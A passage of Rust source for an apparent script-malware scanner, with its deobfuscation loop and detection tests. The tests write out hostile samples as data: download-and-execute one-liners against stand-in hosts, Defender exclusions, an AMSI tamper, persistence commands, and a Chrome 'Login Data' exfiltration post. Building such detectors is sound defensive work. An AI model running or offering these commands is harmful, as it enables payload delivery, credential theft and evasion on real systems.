            || (persists(&c) && !persists(&f))
            || (c.download && c.exec && !(f.download && f.exec))
        {
            report.add(
                "indicator_in_comment_only",
                5,
                source,
                "Sensitive indicators appear only in comments, which are not executed",
            );
        }
    }
}

#[cfg(test)]
pub fn inspect(data: &[u8], report: &mut Report, budget: &Budget) {
    inspect_layers(data, report, budget, &mut |_, _, _| {});
}

/// Like [`inspect`], and calls `visit(report, layer_name, text)` for every decoded
/// layer (not the raw input) so other engines can scan it without a copy.
pub fn inspect_layers(
    data: &[u8],
    report: &mut Report,
    budget: &Budget,
    visit: &mut dyn FnMut(&mut Report, &str, &str),
) {
    // scan.rs caps input at 4 MiB, including partially written files.
    // Root files are capped by scan.rs at 4 MiB; derived layers are capped separately.
    // Decode UTF-16 even for large root scripts instead of silently missing their text.
    let root = match decode_text(data) {
        Some(text) => text,
        None => {
            report.unavailable(
                "unreadable",
                "text_decode_failed",
                "Cannot decode script text",
            );
            return;
        }
    };
    let path = report.path.to_ascii_lowercase();
    let is_batch = path.ends_with(".bat") || path.ends_with(".cmd");
    let lang = Lang::from_path(&path);
    report.analyzer("script_signatures");
    report.analyzer("script_deobfuscation");
    let mut queue = VecDeque::from([Layer {
        text: root,
        origin: "raw".into(),
        depth: 0,
    }]);
    let mut visited = HashSet::new();
    let mut derived_total = 0usize;
    let mut processed = 0usize;

    while let Some(layer) = queue.pop_front() {
        if let Some(reason) = budget.exceeded() {
            report.mark_incomplete(reason);
            break;
        }
        if processed >= MAX_LAYERS {
            break;
        }
        let key = hex::encode(sha2::Sha256::digest(layer.text.as_bytes()));
        if !visited.insert(key) {
            continue;
        }
        processed += 1;
        analyze_layer(&layer, lang, report);
        if layer.depth > 0 {
            visit(
                report,
                &format!("decoded/{processed}:{}", layer.origin),
                &layer.text,
            );
        }
        let derived = derive(&layer.text, is_batch, budget);
        for reason in derived.reasons {
            report.mark_incomplete(reason);
        }
        if layer.depth >= MAX_DEPTH {
            if !derived.layers.is_empty() {
                report.mark_incomplete("max_decode_depth");
            }
            continue;
        }
        for (method, value) in derived.layers {
            let bytes = value.len();
            if derived_total.saturating_add(bytes) > MAX_DERIVED_TOTAL {
                report.mark_incomplete("total_derived_bytes_limit");
                continue;
            }
            if processed + queue.len() >= MAX_LAYERS {
                report.mark_incomplete("max_decoded_layers");
                continue;
            }
            derived_total += bytes;
            queue.push_back(Layer {
                text: value,
                origin: method,
                depth: layer.depth + 1,
            });
        }
    }
    report.decoded_layers = processed.saturating_sub(1);
    if !queue.is_empty() {
        report.mark_incomplete("max_decoded_layers");
    }
}

#[cfg(test)]
fn test_budget() -> Budget {
    Budget::new(std::time::Duration::from_secs(60))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::Report;

    fn scan(code: &str, path: &str) -> Report {
        let mut report = Report::new(path.into(), "script");
        inspect(code.as_bytes(), &mut report, &test_budget());
        report.finish();
        report
    }
    fn has(report: &Report, code: &str) -> bool {
        report.signals.iter().any(|signal| signal.code == code)
    }

    #[test]
    fn benign_code_has_no_signals() {
        let r = scan("print('hello world')", "x.py");
        assert_eq!(r.score, 0);
    }

    // --- P5-02: statement- and comment-aware signals ---

    #[test]
    fn indicators_only_in_comments_are_informational() {
        let r = scan(
            "# Never IEX (New-Object Net.WebClient).DownloadString('x')\n<# Add-MpPreference -ExclusionPath C:\\ #>\nGet-Date\n",
            "a.ps1",
        );
        assert!(has(&r, "indicator_in_comment_only"));
        assert!(!has(&r, "defense_evasion"));
        assert!(!has(&r, "download_and_execute"));
        assert_eq!(r.risk, "low_signal");
    }

    #[test]
    fn hash_and_slashes_inside_strings_are_not_comments() {
        let r = scan(
            "$u = 'https://x.invalid/#frag'; Add-MpPreference -ExclusionPath C:\\\n",
            "a.ps1",
        );
        assert!(has(&r, "defense_evasion"));
        let js = scan(
            "const u = \"http://a.invalid//x\"; eval(await fetch(u))\n",
            "a.js",
        );
        assert!(has(&js, "download_and_execute"));
    }

    #[test]
    fn unterminated_block_comment_does_not_hide_code() {
        let r = scan(
            "<# not closed\nAdd-MpPreference -ExclusionPath C:\\\n",
            "a.ps1",
        );
        assert!(has(&r, "defense_evasion"));
    }

    #[test]
    fn fetched_content_into_code_execution_is_review() {
        for (code, path) in [
            ("IEX (New-Object Net.WebClient).DownloadString('https://x.invalid')", "a.ps1"),
            ("irm https://x.invalid | iex", "a.ps1"),
            ("$s = (New-Object Net.WebClient).DownloadString('https://x.invalid')\n$t = $s.Trim()\nInvoke-Expression $t", "a.ps1"),
            ("import requests\nbody = requests.get('https://x.invalid').text\nexec(body)", "a.py"),
            ("const r = await fetch('https://x.invalid');\nconst t = await r.text();\neval(t);", "a.js"),
        ] {
            let r = scan(code, path);
            assert!(has(&r, "download_and_execute"), "{code}");
            assert!(r.score >= 25, "{code}");
        }
    }

    #[test]
    fn reassigned_variable_is_no_longer_tainted() {
        let r = scan(
            "import requests, subprocess\nv = requests.get('https://x.invalid').text\nv = 'git'\nexec('print(1)')\nsubprocess.run([v, 'pull'])",
            "a.py",
        );
        assert!(!has(&r, "download_and_execute"));
        assert!(has(&r, "download_and_run"));
    }

    #[test]
    fn installer_download_and_run_is_low_signal_but_recorded() {
        let r = scan(
            "Invoke-WebRequest -Uri 'https://dl.example.invalid/t.msi' -OutFile t.msi\nStart-Process msiexec.exe -ArgumentList '/i t.msi /qn' -Wait\n",
            "a.ps1",
        );
        assert!(has(&r, "download_and_run"));
        assert_eq!(r.risk, "low_signal");
    }

    #[test]
    fn staged_download_and_run_is_review() {
        let r = scan(
            "Invoke-WebRequest -Uri 'http://198.51.100.7/a.exe' -OutFile $env:TEMP\\a.exe\nStart-Process $env:TEMP\\a.exe -WindowStyle Hidden\n",
            "a.ps1",
        );
        assert!(has(&r, "download_and_run_staged"));
        assert_eq!(r.risk, "review");
    }

    #[test]
    fn admin_task_is_low_but_risky_persistence_is_review() {
        let admin = scan(
            "Register-ScheduledTask -TaskName 'Cleanup' -Action (New-ScheduledTaskAction -Execute 'cleanmgr.exe')",
            "a.ps1",
        );
        assert!(has(&admin, "persistence_admin_task"));
        assert_eq!(admin.risk, "low_signal");
        for code in [
            "schtasks /create /tn U /tr \"powershell -w hidden -enc AAAA\" /sc onlogon",
            "Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name U -Value x",
            "New-Service -Name U -BinaryPathName 'C:\\Users\\Public\\u.exe'",
        ] {
            let r = scan(code, "a.ps1");
            assert!(has(&r, "persistence"), "{code}");
            assert_eq!(r.risk, "review", "{code}");
        }
    }

    #[test]
    fn batch_and_vbs_comment_lines_are_recognized() {
        let bat = scan(
            "@echo off\nrem schtasks /create /tn x /tr powershell\n:: Clear-EventLog\necho ok\n",
            "a.bat",
        );
        assert!(has(&bat, "indicator_in_comment_only"));
        assert_eq!(bat.risk, "low_signal");
        let vbs = scan("' Clear-EventLog\nWScript.Echo 1\n", "a.vbs");
        assert!(!has(&vbs, "defense_evasion"));
    }

    #[test]
    fn credential_exfiltration_still_detected_across_statements() {
        let r = scan(
            "import requests\nname = 'Login Data'\n\nrequests.post('https://x.invalid', data=name)\n",
            "a.py",
        );
        assert!(has(&r, "possible_exfiltration"));
        assert_eq!(r.risk, "high");
    }

    // --- P5-03: PowerShell string literals are data, not invocations ---

    #[test]
    fn cmdlet_names_listed_as_strings_are_not_invocations() {
        let manifest = "@{\n  CmdletsToExport = @('Invoke-Expression', 'Invoke-RestMethod',\n    'Clear-EventLog', 'Register-ScheduledTask', 'Start-Process')\n}\n";
        let r = scan(manifest, "Utility.psd1");
        assert!(r.signals.is_empty(), "{:?}", r.signals);
        assert_eq!(r.risk, "low_signal");
    }

    #[test]
    fn strings_passed_to_execution_sinks_are_still_code() {
        for code in [
            "iex \"irm https://x.invalid/a\"",
            "Invoke-Expression 'IEX (New-Object Net.WebClient).DownloadString(\"https://x.invalid\")'",
            "$u = 'https://x.invalid'; $s = irm $u; iex \"$s\"",
        ] {
            let r = scan(code, "a.ps1");
            assert!(has(&r, "download_and_execute"), "{code}");
        }
    }

    #[test]
    fn data_in_strings_still_counts() {
        // AMSI targets, credential store names and URLs live in strings.
        let r = scan(
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
            "a.ps1",
        );
        assert!(has(&r, "defense_evasion"));
        let r = scan("$p = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\"\nInvoke-RestMethod -Uri 'https://x.invalid' -Method Post -InFile $p", "a.ps1");
        assert!(has(&r, "possible_exfiltration"));
        let r = scan("Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name x -Value y", "a.ps1");
        assert!(has(&r, "persistence"));
    }

    #[test]
    fn here_strings_and_escapes_are_blanked_correctly() {
        let code = "$doc = @'\nInvoke-Expression and Clear-EventLog are only words here\n'@\n$q = 'it''s Start-Process'\n$d = \"a `\" Invoke-Expression\"\nGet-Date\n";
        let blank = blank_ps_strings(code);
        assert_eq!(blank.len(), code.len());
        assert!(!blank.contains("Invoke-Expression"));
        assert!(!blank.contains("Start-Process"));
        assert!(blank.contains("Get-Date"));
        assert_eq!(blank.matches('\n').count(), code.matches('\n').count());
        let r = scan(code, "a.ps1");
        assert!(r.signals.is_empty(), "{:?}", r.signals);
    }

    #[test]
    fn subexpressions_and_unterminated_strings_are_not_hidden() {
        let r = scan(
            "$x = \"$(Invoke-Expression (irm https://x.invalid))\"",
            "a.ps1",
        );
        assert!(has(&r, "download_and_execute"));
        let r = scan(
            "Clear-EventLog -LogName Application; $s = 'unterminated",
            "a.ps1",
        );
        assert!(has(&r, "defense_evasion"));
        let blank = blank_ps_strings("'\u{00e9}\u{3042}' + \"\u{1F600}\"");
        assert_eq!(blank.len(), "'\u{00e9}\u{3042}' + \"\u{1F600}\"".len());
    }

    #[test]
    fn comment_spans_are_byte_ranges_of_the_original_text() {
        let text = "x = 1 # \u{00e9}t\u{00e9} Add-MpPreference -ExclusionPath\ny = '#not'\n";
        let spans = comment_spans(text, "a.py").unwrap();
        assert_eq!(spans.len(), 1);
        let (s, e) = spans[0];
        assert!(text[s..e].starts_with("# "));
        assert!(text[s..e].ends_with("-ExclusionPath"));
        let ps = "<# Add-MpPreference -ExclusionPath #>\nGet-Date";
        let spans = comment_spans(ps, "a.ps1").unwrap();
        assert_eq!(
            &ps[spans[0].0..spans[0].1],
            "<# Add-MpPreference -ExclusionPath #>"
        );
        let bat = "@echo off\nrem Add-MpPreference -ExclusionPath\n";
        let spans = comment_spans(bat, "a.bat").unwrap();
        assert!(bat[spans[0].0..spans[0].1].starts_with("rem "));
        assert!(comment_spans("x", "a.hta").is_none());
    }

    #[test]
    fn statement_split_is_bounded_and_char_safe() {
        let (s, capped) = statements("a=1;b=\u{00e9}=2;\n`\ncontinued");
        assert!(!capped);
        assert!(s.iter().any(|x| x.contains('\u{00e9}')));
        let many = "x;".repeat(MAX_STATEMENTS + 10);
        let (s, capped) = statements(&many);
        assert!(capped);
        assert_eq!(s.len(), MAX_STATEMENTS);
    }
    #[test]
    fn browser_credential_exfiltration_detected() {
        let r = scan(
            "name='Login Data'; requests.post('https://example.invalid/upload',data=name)",
            "x.py",
        );
        assert!(has(&r, "possible_exfiltration"));
        assert_eq!(r.risk, "high");
    }
    #[test]
    fn base64_payload_is_decoded_but_not_executed() {
        let payload = "name='Login Data'; requests.post('https://example.invalid/x',data=name)";
        let code = format!("exec(base64.b64decode('{}'))", STANDARD.encode(payload));
        let r = scan(&code, "x.py");
        assert!(has(&r, "possible_exfiltration"));
        assert!(r.decoded_layers > 0);
        assert!(!serde_json::to_string(&r)
            .unwrap()
            .contains("example.invalid"));
    }
    #[test]
    fn powershell_utf16le_encoded_command() {
        let content = "Add-MpPreference -ExclusionPath C:\\Temp";
        let utf16 = content
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect::<Vec<u8>>();
        let r = scan(
            &format!("powershell -EncodedCommand {}", STANDARD.encode(utf16)),
            "x.ps1",
        );
        assert!(has(&r, "defense_evasion"));
    }
    #[test]
    fn javascript_charcode_obfuscation() {
        let values = "AmsiUtils"
            .chars()
            .map(|c| (c as u32).to_string())
            .collect::<Vec<_>>()
            .join(",");
        let r = scan(&format!("const x = String.fromCharCode({values});"), "x.js");
        assert!(has(&r, "defense_evasion"));
    }
    #[test]
    fn batch_local_variable_and_caret() {
        let r = scan(
            "set \"X=Add-MpPreference\"\n%X% -ExclusionPath C:\\Temp\npo^wer^shell",
            "x.cmd",
        );
        assert!(has(&r, "defense_evasion"));
    }
    #[test]
    fn gzip_expansion_over_limit_is_rejected() {
        use std::io::Write;
        let mut encoder =
            flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
        encoder
            .write_all(&vec![b'A'; MAX_LAYER_BYTES + 10])
            .unwrap();
        assert!(inflate_bounded(&encoder.finish().unwrap()).is_none());
    }
}

#[cfg(test)]
mod resource_limit_tests {
    use super::*;
    use crate::model::Report;

    fn inspect_sample(sample: &str, name: &str) -> Report {
        let mut r = Report::new(name.into(), "script");
        inspect(sample.as_bytes(), &mut r, &test_budget());
        r.finish();
        r
    }

    #[test]
    fn repeated_batch_replacement_is_bounded_before_allocation() {
        let mut data = String::from("set \"A=");
        data.push_str(&"x".repeat(4096));
        data.push_str("\"\n");
        data.push_str(&"%A%".repeat(64));
        let r = inspect_sample(&data, "suspicious.bat");
        assert_eq!(r.status, "incomplete");
        assert_eq!(r.risk, "incomplete");
        assert!(r.incomplete_reasons.contains(&"batch_expansion_size_limit"));
    }

    #[test]
    fn small_batch_variables_still_decode_and_detect() {
        let r = inspect_sample(
            "set \"X=Add-MpPreference\"\n%X% -ExclusionPath C:\\Temp",
            "sample.cmd",
        );
        assert!(r.signals.iter().any(|s| s.code == "defense_evasion"));
        assert!(r.analysis_complete);
    }

    #[test]
    fn large_batch_caret_does_not_allocate_unbounded_derived_copy() {
        let r = inspect_sample(
            &format!("^{}", "A".repeat(MAX_LAYER_BYTES + 1)),
            "sample.cmd",
        );
        assert_eq!(r.status, "incomplete");
        assert!(r.incomplete_reasons.contains(&"batch_caret_size_limit"));
    }

    #[test]
    fn oversized_compressed_base64_is_not_silently_ignored() {
        use std::io::Write;
        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        encoder.write_all(&vec![b'A'; MAX_LAYER_BYTES + 1]).unwrap();
        let payload = STANDARD.encode(encoder.finish().unwrap());
        let r = inspect_sample(&format!("exec(base64.b64decode('{payload}'))"), "sample.py");
        assert_eq!(r.status, "incomplete");
        assert!(r.incomplete_reasons.contains(&"encoded_payload_size_limit"));
    }

    #[test]
    fn repeated_obfuscation_layers_hit_cap_with_explicit_warning() {
        let samples = (0..25)
            .map(|i| {
                let command = format!("Add-MpPreference -ExclusionPath C:\\Temp{i}");
                STANDARD.encode(command)
            })
            .collect::<Vec<_>>()
            .join(" ");
        let r = inspect_sample(&samples, "many.py");
        assert_eq!(r.status, "incomplete");
        assert!(r.incomplete_reasons.contains(&"max_decoded_layers"));
        assert!(r.signals.iter().any(|s| s.code == "defense_evasion"));
    }

    #[test]
    fn bounded_replace_checks_length_before_allocation() {
        assert_eq!(replace_bounded("abc", "%X%", "X", 10), Ok(None));
        assert_eq!(
            replace_bounded("%X%", "%X%", "ab", 2),
            Ok(Some("ab".into()))
        );
        assert_eq!(replace_bounded("%X%", "%X%", "abc", 2), Err(()));
    }
}

#[cfg(test)]
mod candidate_limit_tests {
    use super::*;
    use crate::model::Report;

    #[test]
    fn omitted_base64_candidates_are_marked_incomplete() {
        let payload = STANDARD.encode("print('harmless') and words for a long script");
        let sample = (0..35)
            .map(|_| payload.as_str())
            .collect::<Vec<_>>()
            .join(" ");
        let mut report = Report::new("many.py".into(), "script");
        inspect(sample.as_bytes(), &mut report, &test_budget());
        report.finish();
        assert_eq!(report.status, "incomplete");
        assert!(report.incomplete_reasons.contains(&"candidate_match_limit"));
    }

    #[test]
    fn unprocessed_batch_assignments_are_marked_incomplete() {
        let sample = (0..34)
            .map(|i| format!("set \"VAL{i}=test\""))
            .collect::<Vec<_>>()
            .join("\n");
        let mut report = Report::new("many.cmd".into(), "script");
        inspect(sample.as_bytes(), &mut report, &test_budget());
        report.finish();
        assert!(report
            .incomplete_reasons
            .contains(&"batch_assignment_count_limit"));
        assert_ne!(report.risk, "low_signal");
    }

    #[test]
    fn omitted_batch_lines_are_marked_incomplete() {
        let sample = format!("{}set \"x=A\"\n%x%", "rem no-op\n".repeat(512));
        let mut report = Report::new("many.bat".into(), "script");
        inspect(sample.as_bytes(), &mut report, &test_budget());
        report.finish();
        assert!(report
            .incomplete_reasons
            .contains(&"batch_assignment_scan_limit"));
    }
}

#[cfg(test)]
mod budget_and_property_tests {
    use super::*;
    use crate::model::{Assessment, Report};
    use std::time::Duration;

    /// Deterministic xorshift PRNG so failures are reproducible without extra crates.
    struct Rng(u64);
    impl Rng {
        fn next(&mut self) -> u64 {
            self.0 ^= self.0 << 13;
            self.0 ^= self.0 >> 7;
            self.0 ^= self.0 << 17;
            self.0
        }
        fn below(&mut self, n: usize) -> usize {
            (self.next() % n as u64) as usize
        }
    }

    fn run(data: &[u8], name: &str, budget: Duration) -> Report {
        let mut report = Report::new(name.into(), "script");
        inspect(data, &mut report, &Budget::new(budget));
        report.finish();
        report
    }

    fn assert_contract(r: &Report) {
        assert_eq!(r.analysis_complete, r.assessment == Assessment::Analyzed);
        if r.risk == "low_signal" {
            assert_eq!(r.assessment, Assessment::Analyzed);
        }
        if r.assessment == Assessment::Incomplete {
            assert!(!r.incomplete_reasons.is_empty());
        }
        assert!(r.decoded_layers < MAX_LAYERS);
        assert!(r.score <= 100);
    }

    #[test]
    fn exhausted_time_budget_is_incomplete_not_clean() {
        let r = run(b"print('hello')", "x.py", Duration::ZERO);
        assert_eq!(r.assessment, Assessment::Incomplete);
        assert_eq!(r.risk, "incomplete");
        assert!(r.incomplete_reasons.contains(&"analysis_time_limit"));
        assert_contract(&r);
    }

    #[test]
    fn randomized_obfuscation_fragments_never_panic_or_break_the_contract() {
        let fragments = [
            "QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCBDOlxUZW1w",
            "String.fromCharCode(65,109,115,105,85,116,105,108,115)",
            "chr(65)+chr(66)+chr(67)",
            "'ab'+'cd'+'ef'",
            "\"olleh\".split('').reverse().join('')",
            "\\x41\\x42\\x43\\x44",
            "\\u0041\\u0042\\u0043\\u0044",
            "set \"A=x\"\n",
            "%A%%A%",
            "^",
            "-enc ",
            "exec(",
            "requests.post('https://example.invalid')",
            "\n",
            "====",
            "\u{0}",
            "\u{fffd}",
        ];
        let mut rng = Rng(0x5eed_a3a3_1234_9876);
        for i in 0..400 {
            let mut sample = String::new();
            for _ in 0..rng.below(200) {
                sample.push_str(fragments[rng.below(fragments.len())]);
            }
            let name = ["x.py", "x.js", "x.ps1", "x.bat"][i % 4];
            let mut bytes = sample.into_bytes();
            // Occasionally corrupt bytes or force a UTF-16 interpretation.
            if i % 7 == 0 && !bytes.is_empty() {
                let at = rng.below(bytes.len());
                bytes[at] = rng.next() as u8;
            }
            if i % 11 == 0 {
                bytes.splice(0..0, [0xff, 0xfe]);
            }
            assert_contract(&run(&bytes, name, Duration::from_secs(60)));
        }
    }

    #[test]
    fn random_binary_input_never_panics() {
        let mut rng = Rng(0xdead_beef_cafe_f00d);
        for _ in 0..300 {
            let len = rng.below(4096);
            let bytes: Vec<u8> = (0..len).map(|_| rng.next() as u8).collect();
            assert_contract(&run(&bytes, "x.js", Duration::from_secs(60)));
        }
    }

    #[test]
    fn adversarial_repetitions_are_bounded_and_explained() {
        let cases: [(&str, &str); 7] = [
            ("x.py", "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0NTY3"),
            ("x.js", "fromCharCode(65,66,67,68,69,70,71,72) "),
            ("x.py", "chr(65)+"),
            ("x.js", "'aaaa'+"),
            ("x.js", "\\x41"),
            ("x.bat", "a^"),
            ("x.bat", "%A%"),
        ];
        for (name, unit) in cases {
            let sample = unit.repeat((1024 * 1024) / unit.len());
            let r = run(sample.as_bytes(), name, Duration::from_secs(60));
            assert_contract(&r);
        }
    }

    #[test]
    fn high_ratio_compressed_payload_is_capped() {
        use std::io::Write;
        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::best());
        let chunk = vec![b'A'; 1024 * 1024];
        for _ in 0..64 {
            encoder.write_all(&chunk).unwrap();
        }
        let compressed = encoder.finish().unwrap();
        // 64 MiB expands from a few dozen KiB; the decoder must stop at the layer cap.
        assert!(compressed.len() < 96 * 1024);
        assert!(inflate_bounded(&compressed).is_none());
        let payload = STANDARD.encode(&compressed);
        let r = run(
            format!("exec(base64.b64decode('{payload}'))").as_bytes(),
            "x.py",
            Duration::from_secs(60),
        );
        assert_contract(&r);
        assert_eq!(r.assessment, Assessment::Incomplete);
    }
}
